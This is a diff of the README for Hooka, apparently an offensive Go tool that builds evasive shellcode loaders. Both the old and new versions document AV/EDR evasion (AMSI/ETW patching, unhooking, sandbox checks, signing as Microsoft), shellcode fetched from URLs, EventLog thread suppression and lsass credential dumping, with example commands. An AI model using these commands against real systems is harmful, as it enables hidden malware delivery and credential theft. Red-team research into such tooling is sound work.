@@ -1,7 +1,6 @@
 <p align="center">
-  <img src="assets/gopher.png" width="130" heigth="60" alt="Gopher"/>
   <h1 align="center">Hooka</h1>
-  <h4 align="center">Evasive shellcode loader, hooks detector and more</h4>
+  <h4 align="center">Shellcode loader generator with multiples features</h4>
   <h6 align="center">Coded with 💙 by D3Ext</h6>
 </p>
 
@@ -19,11 +18,6 @@
     <img src="https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat">
   </a>
 
-  <a href="https://goreportcard.com/report/github.com/D3Ext/Hooka">
-      <img src="https://goreportcard.com/badge/github.com/D3Ext/Hooka" alt="go report card">
-  </a>
-
-
 </p>
 
 <p align="center">
@@ -31,180 +25,160 @@
   <a href="#features">Features</a> •
   <a href="#usage">Usage</a> •
   <a href="#library">Library</a> •
-  <a href="#contributing">Contributing</a> •
   <a href="#disclaimer">Disclaimer</a>
 </p>
 
 # Introduction
 
-I started this project to create a powerful shellcode loader with a lot of malleable capabilities via CLI flags like detecting hooked functions, using Hell's and Galo's Gate techniques and more. Why in Golang? Because it's a great language to develop malware and this project can help with it by providing an stable API with some functions which can be really useful. If you have any question feel free to open an issue or whatever you want.
-
-However I've also taken some code from [BananaPhone](https://github.com/C-Sto/BananaPhone) and [Doge-Gabh](https://github.com/timwhitez/Doge-Gabh) projects (thanks a lot to ***C-Sto*** and ***timwhitez***)
-
-***Tested on x64, Windows 10***
+Hooka is able to generate shellcode loaders with multiple capabilities. It is also based on other tools like [BokuLoader](https://github.com/boku7/BokuLoader), [Freeze](https://github.com/optiv/Freeze) or [Shhhloader](https://github.com/icyguider/Shhhloader), and it tries to implement more evasion features. Why in Golang? Why not?
 
 # Features
 
-- Get shellcode from remote URL or local file
-- Shellcode reflective DLL injection (***sRDI***)
-- ***AMSI*** and ***ETW*** patch
-- ***Phant0m*** technique to kill EventLog threads (see [here](https://github.com/hlldz/Phant0m))
-- Detects hooked functions (i.e. NtCreateThread)
-- Compatible with base64 and hex encoded shellcode
-- Hell's Gate + Halo's Gate technique
-- Capable of unhooking user-mode syscalls via multiple techniques:
-  - Classic unhooking
-  - Full DLL unhooking
-  - Perun's Fart technique
+This tool is able to generate loaders with this features:
 
 - Multiple shellcode injection techniques:
-  - CreateRemoteThread
-  - CreateProcess
-  - EnumSystemLocales
-  - Fibers
-  - QueueUserApc
-  - UuidFromString
+  - SuspendedProcess
+  - ProcessHollowing
+  - NtCreateThreadEx
   - EtwpCreateEtwThread
-  - RtlCreateUserThread
+  - NtQueueApcThreadEx
+  - No-RWX
 
-- Inject shellcode into a process (not stable and only works via CreateRemoteThread technique)
-- Dump lsass.exe process to a file
+- Get shellcode from raw file, PE, DLL or from a URL
+- EXE and DLL are supported as output loader formats
+
+- Encrypt shellcode using:
+  - AES
+  - 3DES
+  - RC4
+  - XOR
+
+- AMSI and ETW patching (enabled by default)
+- Random variables and function names
+- Shikata Ga Nai obfuscation (see [here](https://github.com/EgeBalci/sgn))
+- Multiple ways to detect sandboxing
+- Enable ACG Guard protection
+- Block non-Microsoft signed DLLs from injecting into created processes
+
+- Capable of unhooking user-mode hooks via multiple techniques:
+  - Classic
+  - Full DLL
+  - Perun's Fart technique
+
+- ***Phant0m*** technique to suspend EventLog threads (see [here](https://github.com/hlldz/Phant0m))
 - Windows API hashing (see [here](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware))
-- Test mode (injects calc.exe shellcode)
-
-- All already mentioned features available through official package API
-
-***This repo is under development so it may contain errors, use it under your own responsability for legal testing purposes***
+- Sign shellcode loader with fake or real certificates
+- Strings obfuscation via Caesar cipher (see [here](https://en.wikipedia.org/wiki/Caesar_cipher))
+- Compress code weight using Golang compile and UPX (if it's installed)
+- Compute binary entropy of the loader
+- Compute MD5, SHA1 and SHA256 checksums to keep track of the loader
 
 # Installation
 
-- Just clone the repository like this:
+Just clone the repository like this:
 
 ```sh
-git clone https://github.com/D3Ext/Hooka
-cd Hooka
-make
+$ git clone https://github.com/D3Ext/Hooka
+$ cd Hooka
+$ make
 ```
+
+After that you will find the binary under the `build/` folder
 
 # Usage
 
-Before using the project you should know that there are some functions from `ntdll.dll` that aren't usually hooked but they always appear to be hooked. Here you have all false positives:
-
-```
-NtGetTickCount
-NtQuerySystemTime
-NtdllDefWindowProc_A
-NtdllDefWindowProc_W
-NtdllDialogWndProc_A
-NtdllDialogWndProc_W
-ZwQuerySystemTime
-```
-
-- Let's see some examples
-
 > Help panel
-```
-```
-
-> Detect hooked functions by EDR (including false positives)
 ```sh
-.\Hooka.exe --hooks
+  _   _                   _              _
+ | | | |   ___     ___   | | __   __ _  | |
+ | |_| |  / _ \   / _ \  | |/ /  / _` | | |
+ |  _  | | (_) | | (_) | |   <  | (_| | |_|
+ |_| |_|  \___/   \___/  |_|\_\  \__,_| (_)
+
+Usage of Hooka:
+  REQUIRED:
+    -i, --input string        payload to inject in raw format, as PE, as DLL or from a URL
+    -o, --output string       name of output file (i.e. loader.exe)
+    -f, --format string       format of the payload to generate (available: exe, dll) (default exe)
+
+  EXECUTION:
+    --proc string      process to spawn (in suspended state) when needed for given execution technique (default notepad.exe)
+    --exec string      technique used to load shellcode (default "SuspendedProcess"):
+                         SuspendedProcess
+                         ProcessHollowing
+                         NtCreateThreadEx
+                         EtwpCreateEtwThread
+                         NtQueueApcThreadEx
+                         No-RWX
+
+  AUXILIARY:
+    -a, --arch string       architecture of the loader to generate (default amd64)
+    -c, --cert string       certificate to sign generated loader with (i.e. cert.pfx)
+    -d, --domain string     domain used to sign loader (i.e. www.microsoft.com)
+
+  ENCODING:
+    --enc string         encrypts shellcode using given algorithm (available: aes, 3des, rc4, xor) (default none)
+    --sgn                use Shikata Ga Nai to encode generated loader (it must be installed on path)
+    --strings            obfuscate strings using Caesar cipher
+
+  EVASION:
+    --unhook string       unhooking technique to use (available: full, peruns)
+    --sandbox             enable sandbox evasion
+    --no-amsi             don't patch AMSI
+    --no-etw              don't patch ETW
+    --hashing             use hashes to retrieve function pointers
+    --acg                 enable ACG Guard to prevent AV/EDR from modifying existing executable code
+    --blockdlls           prevent non-Microsoft signed DLLs from injecting in child processes
+    --phantom             suspend EventLog threads using Phant0m technique. High privileges needed, otherwise loader skips this step
+    --sleep               delay shellcode execution using a custom sleep function
+
+  EXTRA:
+    --calc              use a calc.exe shellcode to test loader capabilities (don't provide input file)
+    --compress          compress generated loader using Golang compiler and UPX if it's installed
+    -r, --rand          use a random set of parameters to create a random loader (just for testing purposes)
+    -v, --verbose       enable verbose to print extra information
+    -h, --help          print help panel
+
+Examples:
+  hooka -i shellcode.bin -o loader.exe
+  hooka -i http://192.168.1.126/shellcode.bin -o loader.exe
+  hooka -i shellcode.bin -o loader.exe --exec NtCreateThreadEx --unhook full --sleep 60 --acg
+  hooka -i shellcode.bin -o loader.dll --domain www.domain.com --enc aes --verbose
 ```
 
-> Test shellcode injection by spawning a calc.exe
+> Generate a simple EXE loader
 ```sh
-.\Hooka.exe --test
+$ hooka_linux_amd64 -i shellcode.bin -o loader.exe
 ```
 
-> Inject shellcode from URL or file
+> Generate a DLL loader
 ```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin
-.\Hooka.exe --file shellcode.bin
+$ hooka_linux_amd64 -i shellcode.bin -o loader.dll -f dll
 ```
 
-> Shellcode reflective dll injection (***sRDI***)
+> Use custom config (various examples)
 ```sh
-.\Hooka.exe --dll evil.dll,xyz
-.\Hooka.exe --remote-dll http://192.168.1.37/evil.dll,xyz
+$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --hashing --agc --sleep --verbose
+$ hooka_linux_amd64 -i shellcode.bin -o loader.exe --exec ProcessHollowing --sgn --strings --blockdlls
+$ hooka_linux_amd64 -i http://xx.xx.xx.xx/shellcode.bin --sandbox --sleep --domain www.microsoft.com --verbose
 ```
-
-> Inject shellcode into remote process (i.e. werfault.exe) **Not all techniques covered!!**
-```sh
-.\Hooka.exe --url http://192.168.116.37/shellcode.bin --pid 5864
-```
-
-> Decode shellcode as hex or base64
-```sh
-.\Hooka.exe --file shellcode.bin --hex
-.\Hooka.exe --file shellcode.bin --b64
-```
-
-> Use Hell's Gate + Halo's Gate to bypass AVs/EDRs
-```sh
-.\Hooka.exe -t CreateRemoteThreadHalos --url http://192.168.116.37/shellcode.bin
-```
-
-> Unhook function before injecting shellcode
-```sh
-.\Hooka.exe --file shellcode.bin --unhook 3
-```
-
-> Patch AMSI and/or ETW
-```sh
-.\Hooka.exe --amsi --url http://192.168.116.37/shellcode.bin
-.\Hooka.exe --etw --url http://192.168.116.37/shellcode.bin
-```
-
-> Kill EventLog service threads (run as admin)
-```sh
-.\Hooka.exe --phantom
-```
-
-> Dump lsass.exe memory to extract credentials (run as admin)
-```sh
-.\Hooka.exe --lsass dump.tmp
-```
-
-As you can see Hooka provides a lot of CLI flags to help you in all kind of situations
 
 # Demo
 
-> Detecting hooks
-<img src="assets/hooks.png">
+<img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo1.png">
 
-> Injecting shellcode via CreateRemoteThread technique
-<img src="assets/crt.png">
-
-> Injecting shellcode using custom flags
-<img src="assets/custom.png">
-
-> Test function
-<img src="assets/test.png">
-
-> Dump lsass memory
-<img src="assets/lsass.png">
+<img src="https://raw.githubusercontent.com/D3Ext/Hooka/main/assets/demo2.png">
 
 # TODO
 
-:ballot_box_with_check: Block other processes to open our process like [BlockOpenHandle](https://github.com/TheD1rkMtr/BlockOpenHandle)
-
-:ballot_box_with_check: Unhook patch (write bytes)
-
-:black_square_button: `--pid` flag to handle process injection
-
-:ballot_box_with_check: Function to find PIDs which haven't loaded a given DLL (i.e. umppc16606.dll)
-
-:black_square_button: Remove Windows Defender privileges to make it useless (see [here](https://github.com/plackyhacker/SandboxDefender))
-
-:black_square_button: Test unhooking functions against EDRs
+- Add direct and indirect syscall
+- Add Chacha20 cypher to encrypt shellcode
+- More OPSEC features
+- General improvement
 
 # Library
 
-To use the official package API see [here](https://github.com/D3Ext/Hooka/tree/main/examples) and [here](https://github.com/D3Ext/Hooka/tree/main/pkg/hooka)
-
-# Contributing
-
-See [CONTRIBUTING.md](https://github.com/D3Ext/Hooka/blob/main/CONTRIBUTING.md)
+The official Golang package has most of the already mentioned features and some others. To make use of it, see [here](https://github.com/D3Ext/Hooka/tree/main/examples) and [here](https://github.com/D3Ext/Hooka/tree/main/pkg/hooka)
 
 # References
 
@@ -214,10 +188,16 @@ You can take a look at some of the mentioned techniques here:
 https://github.com/C-Sto/BananaPhone
 https://github.com/timwhitez/Doge-Gabh
 https://github.com/Ne0nd0g/go-shellcode
+https://github.com/optiv/Freeze
+https://github.com/f1zm0/acheron
+https://github.com/Enelg52/OffensiveGo
 https://github.com/trickster0/TartarusGate
 https://github.com/Kara-4search/HookDetection_CSharp
 https://github.com/RedLectroid/APIunhooker
 https://github.com/plackyhacker/Peruns-Fart
+https://github.com/rasta-mouse/TikiTorch
+https://github.com/phra/PEzor
+https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet
 https://github.com/chvancooten/maldev-for-dummies
 https://blog.sektor7.net/#!res/2021/perunsfart.md
 https://teamhydra.blog/2020/09/18/implementing-direct-syscalls-using-hells-gate/
@@ -225,28 +205,18 @@ https://www.ired.team/offensive-security/defense-evasion/detecting-hooked-syscal
 https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++
 https://www.ired.team/offensive-security/defense-evasion/retrieving-ntdll-syscall-stubs-at-run-time
 https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware
+https://winternl.com/detecting-manual-syscalls-from-user-mode/
 ```
 
 # Disclaimer
 
-Creator has no responsibility for any kind of:
-
-- Illegal use of the project.
-- Law infringement by third parties and users.
-- Malicious act, capable of causing damage to third parties, promoted by the user through this software.
-
-# Changelog
-
-See [CHANGELOG.md](https://github.com/D3Ext/Hooka/blob/main/CHANGELOG.md)
+Use this project under your own responsability! The author is not responsible of any bad usage of the project.
 
 # License
 
 This project is under [MIT](https://github.com/D3Ext/Hooka/blob/main/LICENSE) license
 
-Copyright © 2023, *D3Ext*
+Copyright © 2024, *D3Ext*
 
-# Support
-
-<a href="https://www.buymeacoffee.com/D3Ext" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
 
 
